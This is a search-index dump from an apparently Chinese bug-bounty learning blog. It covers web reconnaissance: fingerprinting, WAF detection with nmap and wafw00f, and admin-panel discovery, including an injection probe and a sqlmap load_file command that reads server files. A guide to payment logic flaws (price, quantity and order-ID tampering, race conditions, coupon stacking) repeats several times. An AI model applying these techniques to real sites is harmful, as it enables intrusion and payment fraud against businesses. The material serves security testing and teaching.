4.3、wappalyzerhttps://www.wappalyzer.com/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:52:3","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#43wappalyzer"},{"categories":["学习"],"content":" 4.4、WhatWebhttp://whatweb.net/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:52:4","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#44whatweb"},{"categories":["学习"],"content":" 4.5、BugScanerhttp://whatweb.bugscaner.com/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:52:5","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#45bugscaner"},{"categories":["学习"],"content":" 4.6、潮汐指纹http://finger.tidesec.net/ ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:52:6","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#46潮汐指纹"},{"categories":["学习"],"content":" 5、数据库类型我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的 各端口对应数据库类型： sql server–1433 oracle–1521 mysql–3306 postgresql–5432 access–默认不开放连接端口，数据库存储在FTP服务器上。 几种数据库的区别： Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库 SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306 Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521 首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。 通常情况：access–asp mysql–php oracle–jsp sqlserver–aspx postgresql–php，常见搭配： ASP 和 ASPX：ACCESS、SQL Server PHP：MySQL、PostgreSQL JSP：Oracle、MySQL 端口扫描判断数据库类型的方法较为准确，但是管理员也可能选择不开放外网数据库端口，开放内网的数据库端口，也有些管理员喜欢使用站库分离的方法或者使用WAF进行拦截端口扫描来防护站点，这样我们通过端口扫描判断数据库类型的方法便有些失效了。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:53:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#5数据库类型"},{"categories":["学习"],"content":" 6、WAF判断安全狗、阿里云云盾、360网站卫士、护卫神等WEB应用程序防火墙，便于采取绕过WAF的办法。 Nmap探测WAF有两种脚本。 一种是http-waf-detect。 命令：nmap -p80,443 –script=http-waf-detect ip 一种是http-waf-fingerprint。 命令：nmap -p80,443 –script=http-waf-fingerprint ip WAFW00F探测WAF 命令：wafw00f -a 域名 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:54:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#6waf"},{"categories":["学习"],"content":" 6.1、在线资产识别云悉WEB资产梳理 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:54:1","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#61在线资产识别"},{"categories":["学习"],"content":" 6.2、手动检测是拦截页面或者HTTP可识别字段在搜索框中输入XSS弹窗代码 ，WAF拦截后判断WAF。 在可能存在的注入页面输入检测注入漏洞代码and 1=2，被WAF拦截后判断WAF。 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:54:2","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#62手动检测是拦截页面或者http可识别字段"},{"categories":["学习"],"content":" 九、后台查找·1弱口令默认后台：admin，admin/login.asp，manage，login.asp等等常见后台 ·2查看网页的链接；一般来说，网站的主页有管理登陆类似的东西，大多数在网站底部版权处或鲁在冒页导肌程等，有些可能被管理员删掉 ·3查看网站图片的属性有可能图片是上传大管理后台目录，但是是在前台显示 ·4查看网站使用的管理系统，从而确定后台 ·5用工具查找：wwwscan，intellitamper，御剑，进行爬虫、字典穷举扫描 ·6robots.txt的帮助：robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看 ·7 GoogleHacker通过语法查找后台 ·8查看网站使用的编辑器是否有默认后台，FCK、ewb等默认后台 ·9短文件利用短文件漏洞进行猜解 ·10、子域名有可能管理后台为admin.xxxxx.com、login.xxxxx.com ·11sqlmap-sql-shell load_file（’d:/wwroot/index.php’）；利用sql注入查看文件源码获取后台 ·12社工、XSS利用社会工程系获取后台，利用存储型XSs获取后台 ","date":"2024-04-26","objectID":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/:55:0","series":null,"tags":["信息收集","总结"],"title":"万字总结信息收集全网最全","uri":"/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/#九后台查找"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/2778 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#"},{"categories":["学习"],"content":" 前言：支付类逻辑漏洞在漏洞挖掘中是常常出现的问题之一。此类漏洞挖掘思路多，奖励高，是炙手可热的漏洞。此篇文章主要围绕挖掘支付逻辑漏洞时的一些思路分享。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:1:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#前言"},{"categories":["学习"],"content":" 支付逻辑漏洞成因：支付漏洞可能由以下原因造成： 前端验证不充分：在前端页面上，没有进行足够的验证和限制，使得用户可以通过修改页面元素或发送自定义请求来篡改支付金额、支付类型、支付状态等。 客户端数据不可信：客户端（如移动应用）在进行支付时，没有对传输的数据进行完整性验证和加密，导致恶意用户可以直接修改数据包中的支付金额、订单号等与订单有关的参数。 服务器端验证不严格：支付请求在到达服务器端时，没有进行足够的验证和校验，使得攻击者能够更改支付相关参数并绕过服务器端的验证机制。 不安全的存储和传输：支付金额数据在存储或传输过程中未经适当的加密保护，导致黑客可以窃取或篡改数据。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:2:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#支付逻辑漏洞成因"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#支付逻辑漏洞挖掘技巧"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#一更改支付金额"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#二更改支付状态"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 